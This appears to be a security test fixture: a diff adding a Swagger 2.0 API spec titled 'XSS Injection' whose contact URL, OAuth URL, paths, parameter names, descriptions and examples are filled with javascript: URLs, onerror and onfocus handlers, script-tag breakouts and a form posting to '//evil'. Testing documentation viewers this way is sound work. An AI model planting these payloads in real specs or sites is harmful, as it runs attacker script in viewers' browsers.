@@ -1,0 +1,98 @@
+{
+    "swagger": "2.0",
+    "info": {
+        "title": "XSS Injection",
+        "description": "test",
+        "version": "2017-06-04T22:56:06+00:00",
+        "contact": {
+            "name": "test",
+            "url": "javascript:alert(document.domain)",
+            "email": "xx.team@%0D%0Ajavascript%3Aalert(1)%2F%2F%0A.com"
+        }
+    },
+    
+    
+    "host": "XSS",
+    "basePath": "XSS",
+    "schemes": [
+        "https"
+    ],
+    "consumes": [
+        "XSS"
+    ],
+    "produces": [
+        "XSS"
+    ],
+  "securityDefinitions": {
+    "oauth2": {
+      "flow": "implicit",
+      "authorizationUrl": "javascript:alert(document.domain)//",
+      "scopes": {
+        "web-api": "test"
+      },
+      "type": "oauth2"
+    }
+    },
+    "security": [
+        {
+            "tokenHeader": ["/xxx'\"><img src=x onerror=alert(document.domain)>"]
+        }
+    ],
+    "paths": {
+        "/><img src=x onerror=alert(document.domain)>": {
+            "post": {
+                "summary": "/'\">bbb</script><img src=x onerror=alert(document.domain)>",
+                "description": "/aaa'\"></script><img src=x onerror=alert(document.domain)>",
+                "tags": ["ccc"],
+                "parameters": [
+                    {
+                        "name": "/xxx'tabindex=0 id=aaa onfocus=alert(document.domain) onmouseover=alert(document.domain) yyy\"zzz></script><img src=x onerror=alert(document.domain)>",
+                        "in": "body",
+                        "schema": {
+                            "type": "object",
+                            "required": [
+                                "/hhh'\"></script><img src=x onerror=alert(document.domain)>"
+                            ],
+                            "properties": {
+                                "/ccc<img src=x onerror=alert(document.domain)>": {
+                                    "type": "string",
+                                    "description": "/iii'\"></script><img src=x onerror=alert(document.domain)>"
+                                }
+                            },
+                            "description": "/ddd'\"></script><img src=x onerror=alert(document.domain)>"
+                        },
+                        "required": true
+                    }
+                ],
+                "responses": {
+                    "200": {
+                        "description": "{<marquee>test</marquee><h1 style='border:2px solid Tomato;'>Hello World</h1><form><button formaction=//evil>XSS</button><textarea name=x>}"
+                    },
+                    "400": {
+                        "description": "/kkk'\"></script><img src=x onerror=alert(document.domain)>",
+                        "schema": {
+                            "type": "object",
+                            "properties": {
+                                "errors": {
+                                    "type": "object",
+                                    "additionalProperties": {
+                                        "type": "string"
+                                    },
+                                    "description": "/lll'\"></script><img src=x onerror=alert(document.domain)>"
+                                }
+                            },
+                            "description": "/mmm'\"></script><img src=x onerror=alert(document.domain)>"
+                        },
+                        "examples": {
+                            "/nnn'\"></script><img src=x onerror=alert(document.domain)>": {
+                                "errors": {
+                                    "/ooo'\"></script><img src=x onerror=alert(document.domain)>": "/ppp'\"></script><img src=x onerror=alert(document.domain)>"
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
